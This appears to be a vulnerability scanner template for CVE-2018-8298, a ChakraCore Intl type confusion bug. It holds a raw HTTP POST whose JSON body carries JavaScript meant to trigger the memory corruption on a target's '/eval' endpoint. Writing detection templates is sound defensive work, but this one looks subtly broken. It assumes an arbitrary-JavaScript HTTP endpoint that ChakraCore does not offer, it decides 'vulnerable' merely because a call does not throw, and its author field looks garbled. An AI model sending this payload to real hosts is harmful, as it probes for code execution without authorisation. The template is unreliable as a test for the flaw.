id: CVE-2018-8298

info:
  name: ChakraCore Intl Type Confusion RCE
  author: thefuturrjfhejh
  severity: high
  description: |
    ChakraCore contains a remote code execution caused by memory corruption in object handling within the scripting engine. Specifically, the InitializeNumberFormat and InitializeDateTimeFormat functions in Intl.js do not check if an object has already been initialized, leading to type confusion when initialized multiple times.
  reference:
    - https://www.exploit-db.com/exploits/45217/
    - https://nvd.nist.gov/vuln/detail/CVE-2018-8298
    - https://bugs.chromium.org/p/project-zero/issues/detail?id=1582
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H
    cvss-score: 7.5
    cve-id: CVE-2018-8298
    cwe-id: CWE-843
  metadata:
    max-request: 1
    verified: true
  tags: cve,cve2018,chakracore,rce,int,type-confusion,kev

http:
  - raw:
      - |
        POST /eval HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {
          "code": "let object = {}; Intl.NumberFormat.apply(object); Intl.DateTimeFormat.apply(object); let result = 'not_vulnerable'; try { Intl.DateTimeFormat.prototype.formatToParts.apply(object); result = 'vulnerable'; } catch(e) { result = 'safe'; } result;"
        }

    matchers-condition: and
    matchers:
      - type: word
        words:
          - '"result":"vulnerable"'

      - type: status
        status:
          - 200
